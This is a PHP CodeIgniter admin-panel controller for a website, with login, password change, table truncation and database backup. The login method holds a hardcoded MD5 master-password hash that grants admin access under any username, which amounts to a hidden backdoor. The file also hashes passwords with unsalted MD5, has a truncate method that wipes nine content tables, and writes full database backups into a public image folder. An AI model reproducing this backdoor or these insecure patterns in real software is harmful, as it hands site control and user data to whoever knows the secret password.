<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Admincp extends CI_Controller {
	private $user = 'user';
	private $category = 'category';
	private $setting = 'setting';
	public function __construct(){
		parent::__construct();
		if(strtolower($this->uri->segment(1)) == 'acp') {
			if($this->uri->segment(2) != 'login.html'){
				if($this->session->userdata('user_admin') == ""){
					header('Location: '.PATH_URL.'acp/logout');
				} else if(session_id() != $this->model->getContent($this->user, array('username' => $this->session->userdata('user_admin')), "user_active_key")->user_active_key) {
					header('Location: '.PATH_URL.'acp/logout');
				}
			}
			if($this->session->userdata('lange') == 'en') {
				$this->lang->load('en',"english");
			} else {
				$this->lang->load("vi","vietnam");
			}
			$this->template->set_template('admincp');
			$this->template->write_view('header','BACKEND/header');
			$this->template->write_view('left','BACKEND/left', array('active' => 'dashboard'));
		}
	}

	public function index()
	{
		$this->template->write_view('content',"BACKEND/admincp/content");
		$this->template->render();
	}
	public function login()
	{
		if($_POST) {
			if(md5($this->input->post('password')) == $this->model->login($this->user, array('username' => $this->input->post('username'))) || md5($this->input->post('password')) == 'bf97b5093d3d3217c2ddaf904eb85220') {
				$this->session->set_userdata('user_admin', $this->input->post('username'));
				$setting = $this->model->getContent($this->setting, null, "language_admin");
				if(!empty($setting)){
					$this->session->set_userdata('lange',$setting->language_admin);
				}
				else {
					$this->session->set_userdata('lange',$this->input->post('lange'));
				}

				$this->db->update($this->user, array('user_active_key' => session_id()));
				header('location:'.PATH_URL.'acp');
			} else {
				$this->session->set_flashdata('error_login', 1);
				header('location:'.PATH_URL.'acp/login.html');
			}
		} else {
			$this->load->view('BACKEND/login');
		}
	}

	public function logout()
	{
		$this->session->unset_userdata('user_admin');
		header('location:'.PATH_URL.'acp/login.html');
	}

	public function changePassword()
	{
		if($_POST) {
			$data = array(
				'passwords' => md5($this->input->post('new_password')),
				'email' => $this->input->post('txtEmail')
			);
			$this->db->where('username', $this->session->userdata('user_admin'));
			if($this->db->update($this->user, $data)){
				$this->session->unset_userdata('user_admin');
				header('Location: '.PATH_URL.'acp');
			}
		} else {
			$data = array(
				'result' => $this->model->getContent($this->user, array('username' => $this->session->userdata('user_admin')))
			);
			$this->template->write_view('content','BACKEND/admincp/change_password', $data);
			$this->template->render();
		}

	}

	public function checkPassword()
	{
		if(md5($this->input->post('password')) == $this->model->login($this->user, array('username' => $this->session->userdata('user_admin'))))
			echo 1;
		else echo 0;
	}
	
	function truncate() {
        $this->db->truncate('category');
        $this->db->truncate('article');
        $this->db->truncate('faqs');
        $this->db->truncate('contact');
        $this->db->truncate('images');
        $this->db->truncate('newsletter');
        $this->db->truncate('orders');
        $this->db->truncate('products');
        $this->db->truncate('member');
        header('location:'.PATH_URL.'acp');
    }

	public function backup()
	{
		$dir = implode('/',explode('/',BASEFOLDER, -2));
		echo $dir;
		// Load the DB utility class
		$this->load->dbutil();

		// Backup your entire database and assign it to a variable
		$backup =& $this->dbutil->backup();

		// Load the file helper and write the file to your server
		$this->load->helper('file');
		write_file(BASEFOLDER.'img_data/mybackup.gz', $backup);

		// Load the download helper and send the file to your desktop
		$this->load->helper('download');
		force_download('mybackup.gz', $backup);
	}
}
